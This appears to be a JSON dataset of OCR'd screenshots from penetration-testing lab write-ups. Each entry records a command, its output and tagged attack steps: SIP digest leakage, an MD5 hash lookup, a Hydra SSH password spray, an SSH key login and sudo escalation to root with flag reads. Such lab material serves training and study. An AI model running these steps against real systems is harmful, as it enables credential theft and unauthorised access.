+      {
+        "command_shown": "exiftool abf668cc40f70bd74ce74e67eb397c27.pdf",
+        "tool": "exiftool",
+        "raw_output": "ExifTool Version Number         : 12.76\nFile Name                       : abf668cc40f70bd74ce74e67eb397c27.pdf\nFile Type                       : PDF\nMIME Type                       : application/pdf\nPDF Version                     : 1.4\nCreator                         : wkhtmltopdf 0.12.3\nProducer                        : Qt 4.8.7\nPage Count                      : 1",
+        "truncated": false,
+        "fidelity": "ocr"
+      }
+    ],
+    "facts_implied": [
+      {
+        "kind": "web.tech"
+      },
+      {
+        "kind": "loot.material"
+      }
+    ],
+    "failures": [],
+    "flow": [
+      "PDF download from /pdfs",
+      "exiftool metadata extraction -> Creator: wkhtmltopdf 0.12.3 (Qt 4.8.7)",
+      "HTML-to-PDF SSRF/LFI payload crafting"
+    ],
+    "notes": "Terminal screenshot running `exiftool` on a generated PDF to reveal `Creator : wkhtmltopdf 0.12.3` and `Producer : Qt 4.8.7` (command and raw output omitted from Markdown code blocks)."
+  },
+  {
+    "source": {
+      "url": "assets/symbolic/capture-003-66e2cb4030.png",
+      "retrieved": "2026-10-29"
+    },
+    "asset": {
+      "hash": "66e2cb4030a10fb804e22e4c42128b67ca3d8a40a9e799e708fb2a8828dd52db",
+      "type": "screenshot",
+      "fidelity": "ocr"
+    },
+    "output_blocks": [
+      {
+        "command_shown": "ssh -i id_rsa p4yl0ad@192.168.162.177",
+        "tool": "ssh",
+        "raw_output": "Microsoft Windows [Version 10.0.17763.2300]\n(c) 2018 Microsoft Corporation. All rights reserved.\n\np4yl0ad@SYMBOLIC C:\\Users\\p4yl0ad>",
+        "truncated": false,
+        "fidelity": "ocr"
+      }
+    ],
+    "facts_implied": [
+      {
+        "kind": "ssh.authenticated"
+      },
+      {
+        "kind": "foothold.windows"
+      },
+      {
+        "kind": "access.shell"
+      },
+      {
+        "kind": "host.os_family"
+      },
+      {
+        "kind": "host.hostname"
+      }
+    ],
+    "failures": [],
+    "flow": [
+      "leaked SSH private key + webpage username p4yl0ad",
+      "OpenSSH-for-Windows login landing cmd.exe prompt p4yl0ad@SYMBOLIC"
+    ],
+    "notes": "Terminal screenshot showing Windows `cmd.exe` banner (`Microsoft Windows [Version 10.0.17763.2300]`) and `p4yl0ad@SYMBOLIC C:\\Users\\p4yl0ad>` prompt after SSH key login."
+  },
+  {
+    "source": {
+      "url": "assets/voip/capture-001-e36201c587.png",
+      "retrieved": "2026-10-29"
+    },
+    "asset": {
+      "hash": "e36201c587a4443ef6d9436d1a3c6fd0bcbc4d91c01245c12507c29287c7c0d7",
+      "type": "screenshot",
+      "fidelity": "ocr"
+    },
+    "output_blocks": [
+      {
+        "command_shown": "POST http://192.168.183.156/login.php",
+        "tool": "browser",
+        "raw_output": "VOIP Manager\nVoip Manager - Login\nWrong username or password",
+        "truncated": false,
+        "fidelity": "ocr"
+      }
+    ],
+    "facts_implied": [
+      {
+        "kind": "web.login_form"
+      },
+      {
+        "kind": "web.title"
+      },
+      {
+        "kind": "blocker.logon_failure"
+      }
+    ],
+    "failures": [
+      {
+        "blocker": "blocker.logon_failure",
+        "error": "Wrong username or password"
+      }
+    ],
+    "flow": [
+      "Port 80 /login.php Voip Manager enumeration",
+      "Default admin credential rejection"
+    ],
+    "notes": "Browser capture of port 80 Voip Manager login form returning 'Wrong username or password' on default credentials."
+  },
+  {
+    "source": {
+      "url": "assets/voip/capture-002-953c95dce4.png",
+      "retrieved": "2026-10-29"
+    },
+    "asset": {
+      "hash": "953c95dce415b9730b7311d579147da09968a5a96e2fd9f69c1a76586228dffc",
+      "type": "screenshot",
+      "fidelity": "ocr"
+    },
+    "output_blocks": [
+      {
+        "command_shown": "GET http://192.168.183.156:8000/login.php",
+        "tool": "browser",
+        "raw_output": "192.168.183.156:8000/login.php\nUsername: Enter Username\nPassword: Enter Password\nLogin",
+        "truncated": false,
+        "fidelity": "ocr"
+      }
+    ],
+    "facts_implied": [
+      {
+        "kind": "http.reachable"
+      },
+      {
+        "kind": "web.login_form"
+      }
+    ],
+    "failures": [],
+    "flow": [
+      "Port 8000 secondary HTTP login form discovery"
+    ],
+    "notes": "Browser capture of secondary web login portal at http://192.168.183.156:8000/login.php."
+  },
+  {
+    "source": {
+      "url": "assets/voip/capture-003-90b4317c5e.png",
+      "retrieved": "2026-10-29"
+    },
+    "asset": {
+      "hash": "90b4317c5edfeec632eba4c2231c45be91e77bfb5d12a8ea272226ef3e7c8897",
+      "type": "screenshot",
+      "fidelity": "ocr"
+    },
+    "output_blocks": [
+      {
+        "command_shown": "POST http://192.168.183.156:8000/login.php",
+        "tool": "browser",
+        "raw_output": "IP Phone | Hardware version: 3302BC   VOIP: v2.0\nSETUP | ADVANCED | INFORMATION | LOGS | CONFIGURATION\nVOIP",
+        "truncated": false,
+        "fidelity": "ocr"
+      }
+    ],
+    "facts_implied": [
+      {
+        "kind": "credential.validated"
+      },
+      {
+        "kind": "web.tech"
+      },
+      {
+        "kind": "service.version"
+      }
+    ],
+    "failures": [],
+    "flow": [
+      "Default admin:<redacted> authentication on port 8000",
+      "IP Phone Hardware version 3302BC VOIP v2.0 console access"
+    ],
+    "notes": "Authenticated browser capture of port 8000 IP Phone console disclosing Hardware version 3302BC and VOIP v2.0."
+  },
+  {
+    "source": {
+      "url": "assets/voip/capture-004-e3e25c66c3.png",
+      "retrieved": "2026-10-29"
+    },
+    "asset": {
+      "hash": "e3e25c66c3414feb993b0adc04dd7020ea9a252c3d63fbe41ed19e5b98ae967d",
+      "type": "screenshot",
+      "fidelity": "ocr"
+    },
+    "output_blocks": [
+      {
+        "command_shown": "python3 sipdigestleak.py -i 192.168.183.156",
+        "tool": "sippts",
+        "raw_output": "[v] Target: 192.168.183.156:5060/UDP\n[=>] Request INVITE\n[<=] Response 180 Ringing\n[<=] Response 200 OK\n[=>] Request ACK\n[<=] Received BYE\n[=>] Request 407 Proxy Authentication Required\nAuth=Digest username=\"adm_sip\", uri=\"sip:127.0.0.1:5060\", password=\"<redacted>\", algorithm=MD5",
+        "truncated": false,
+        "fidelity": "ocr"
+      }
+    ],
+    "facts_implied": [
+      {
+        "kind": "service.sip"
+      },
+      {
+        "kind": "hash.candidate"
+      },
+      {
+        "kind": "credential.candidate"
+      }
+    ],
+    "failures": [],
+    "flow": [
+      "UDP 5060 SIP service targeting",
+      "sipdigestleak.py 407 Proxy Authentication Required challenge on BYE",
+      "SIP Digest MD5 credential hash capture for adm_sip"
+    ],
+    "notes": "Terminal capture of sippts sipdigestleak.py leaking SIP Digest username adm_sip and MD5 hash over 5060/UDP."
+  },
+  {
+    "source": {
+      "url": "assets/voip/capture-005-35983270e8.png",
+      "retrieved": "2026-10-29"
+    },
+    "asset": {
+      "hash": "35983270e8bff33bf804097579a047719eb5bd889e32110bb57ef5c981738961",
+      "type": "screenshot",
+      "fidelity": "ocr"
+    },
+    "output_blocks": [
+      {
+        "command_shown": "crackstation md5 lookup",
+        "tool": "crackstation",
+        "raw_output": "Hash: <redacted> | Type: md5 | Result: <redacted>",
+        "truncated": false,
+        "fidelity": "ocr"
+      }
+    ],
+    "facts_implied": [
+      {
+        "kind": "hash.type"
+      },
+      {
+        "kind": "credential.plaintext"
+      }
+    ],
+    "failures": [],
+    "flow": [
+      "Unsalted MD5 hash lookup",
+      "Plaintext password recovery for adm_sip"
+    ],
+    "notes": "Browser capture of CrackStation resolving the leaked 32-hex MD5 value from sipdigestleak directly to plaintext."
+  },
+  {
+    "source": {
+      "url": "assets/voip/capture-006-f426e810a7.png",
+      "retrieved": "2026-10-29"
+    },
+    "asset": {
+      "hash": "f426e810a7fdb1ab3488554ff3b627b554acf040ed1e8bfc5c79350905d96857",
+      "type": "screenshot",
+      "fidelity": "ocr"
+    },
+    "output_blocks": [
+      {
+        "command_shown": "GET http://192.168.183.156/streams.php",
+        "tool": "browser",
+        "raw_output": "Call Data Records >> RAW Streams -> Stream Rates\nInput #0, wav, from 'Call-id':\nStream #0:0: Audio: pcm_s16le ([1][0][0][0] / 0x0001), 8000 Hz, mono, s16, 128 kb/s\nStream mapping: Stream #0:0 -> #0:0 (pcm_s16le (native) -> pcm_mulaw (native))\nOutput #0, rtp, to 'raw': PT=ITU-T G.711 PCMU\nStream #0:0: Audio: pcm_mulaw, 8000 Hz, mono, s16, 64 kb/s",
+        "truncated": false,
+        "fidelity": "ocr"
+      }
+    ],
+    "facts_implied": [
+      {
+        "kind": "credential.validated"
+      },
+      {
+        "kind": "web.paths"
+      },
+      {
+        "kind": "loot.material"
+      }
+    ],
+    "failures": [],
+    "flow": [
+      "Port 80 VoIP Solutions login with adm_sip credential",
+      "CDR Stream Rates metadata inspection (/streams.php)",
+      "G.711 PCMU pcm_mulaw 8000 Hz mono codec parameter discovery for sox conversion"
+    ],
+    "notes": "Authenticated browser capture of /streams.php displaying ffmpeg/libav stream metadata (pcm_mulaw, 8000 Hz, mono), explaining the exact sox flags used to decode the raw CDR audio dump."
+  },
+  {
+    "source": {
+      "url": "assets/voip/capture-009-820d364561.png",
+      "retrieved": "2026-10-29"
+    },
+    "asset": {
+      "hash": "820d364561c5b12291ff808e5453247995714bb1958734603a202712143ac6c7",
+      "type": "screenshot",
+      "fidelity": "ocr"
+    },
+    "output_blocks": [
+      {
+        "command_shown": "play out.wav",
+        "tool": "audio-player",
+        "raw_output": "0:06 / 0:06",
+        "truncated": false,
+        "fidelity": "ocr"
+      }
+    ],
+    "facts_implied": [
+      {
+        "kind": "loot.material"
+      }
+    ],
+    "failures": [],
+    "flow": [
+      "Converted WAV audio playback (6-second voicemail)",
+      "Spoken password reset disclosure"
+    ],
+    "notes": "Browser HTML5 audio player widget showing 0:06 / 0:06 playback of out.wav; spoken credential content is audio-only."
+  },
+  {
+    "source": {
+      "url": "assets/voip/capture-010-c9e177abe2.png",
+      "retrieved": "2026-10-29"
+    },
+    "asset": {
+      "hash": "c9e177abe2874f8e20da6db56888f825fb2da454038dd8d1c0dc888770558489",
+      "type": "screenshot",
+      "fidelity": "ocr"
+    },
+    "output_blocks": [
+      {
+        "command_shown": "GET http://192.168.183.156:8000/ (INFORMATION -> USERS)",
+        "tool": "browser",
+        "raw_output": "REGISTERED USERS\nWilliam: ID-2983\nEmma: ID-3029\nVoiper: ID-1462\nJohn: ID-2174\nOlivia: ID-9811\nAva: ID-2111\nRocky: Disabled\nNoah Disabled",
+        "truncated": false,
+        "fidelity": "ocr"
+      }
+    ],
+    "facts_implied": [
+      {
+        "kind": "web.users"
+      },
+      {
+        "kind": "credential.candidate"
+      }
+    ],
+    "failures": [],
+    "flow": [
+      "Port 8000 IP Phone INFORMATION -> USERS tab inspection",
+      "Extraction of 8 candidate usernames for SSH password spray"
+    ],
+    "notes": "Browser capture of port 8000 IP Phone REGISTERED USERS panel listing 8 users (William, Emma, Voiper, John, Olivia, Ava, Rocky, Noah) absent from Markdown code blocks."
+  },
+  {
+    "source": {
+      "url": "assets/voip/capture-011-3ce6969c9f.png",
+      "retrieved": "2026-10-29"
+    },
+    "asset": {
+      "hash": "3ce6969c9f1006a0864b27de8061a12229d83570ead97a3033ae9b190a94bb76",
+      "type": "screenshot",
+      "fidelity": "ocr"
+    },
+    "output_blocks": [
+      {
+        "command_shown": "hydra -L username.txt -p <redacted> ssh://192.168.183.156 -t 4",
+        "tool": "hydra",
+        "raw_output": "[DATA] max 4 tasks per 1 server, overall 4 tasks, 8 login tries (l:8/p:1), ~2 tries per task\n[DATA] attacking ssh://192.168.183.156:22/\n[22][ssh] host: 192.168.183.156   login: voiper   password: <redacted>",
+        "truncated": false,
+        "fidelity": "ocr"
+      }
+    ],
+    "facts_implied": [
+      {
+        "kind": "ssh.reachable"
+      },
+      {
+        "kind": "credential.validated"
+      }
+    ],
+    "failures": [],
+    "flow": [
+      "Hydra SSH single-password spray across 8 VoIP usernames",
+      "Valid SSH login voiper discovered on port 22"
+    ],
+    "notes": "Terminal screenshot of Hydra v9.5 validating SSH credentials for user voiper against port 22."
+  },
+  {
+    "source": {
+      "url": "assets/voip/capture-012-b42825ba9a.png",
+      "retrieved": "2026-10-29"
+    },
+    "asset": {
+      "hash": "b42825ba9ad59f3149b3a608defee77e009078c95e1fb4dd9c2a691bc4825bde",
+      "type": "screenshot",
+      "fidelity": "ocr"
+    },
+    "output_blocks": [
+      {
+        "command_shown": "ssh voiper@192.168.183.156",
+        "tool": "ssh",
+        "raw_output": "Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-65-generic x86_64)\n$ id\nuid=1000(voiper) gid=1000(voiper) groups=1000(voiper)\n$ sudo -l\nUser voiper may run the following commands on VOIP:\n    (ALL : ALL) ALL\n$ sudo su\nroot@VOIP:/home/voiper# whoami;id;cat /home/voiper/local.txt ;cat /root/proof.txt\nroot\nuid=0(root) gid=0(root) groups=0(root)\n<redacted>\n<redacted>",
+        "truncated": false,
+        "fidelity": "ocr"
+      }
+    ],
+    "facts_implied": [
+      {
+        "kind": "ssh.authenticated"
+      },
+      {
+        "kind": "foothold.linux"
+      },
+      {
+        "kind": "host.os_family"
+      },
+      {
+        "kind": "host.kernel"
+      },
+      {
+        "kind": "privesc.sudo_all"
+      },
+      {
+        "kind": "access.root"
+      },
+      {
+        "kind": "objective.flag_located_user"
+      },
+      {
+        "kind": "objective.flag_located_root"
+      },
+      {
+        "kind": "proof.captured"
+      }
+    ],
+    "failures": [
+      {
+        "blocker": "hydra_flag_case_error",
+        "error": "[ERROR] File for passwords not found: <redacted> (background pane shows -P instead of -p)"
+      }
+    ],
+    "flow": [
+      "SSH login as voiper on Ubuntu 20.04.2 LTS (5.4.0-65-generic)",
+      "sudo -l enumeration revealing (ALL : ALL) ALL",
+      "sudo su privilege escalation to uid=0(root)",
+      "local.txt and proof.txt capture"
+    ],
+    "notes": "Terminal screenshot showing full SSH foothold, Ubuntu 20.04.2 LTS banner, sudo -l (ALL : ALL) ALL privilege escalation to root, and flag reads; background tmux pane also preserves a prior Hydra -P vs -p flag error."
+  }
+]
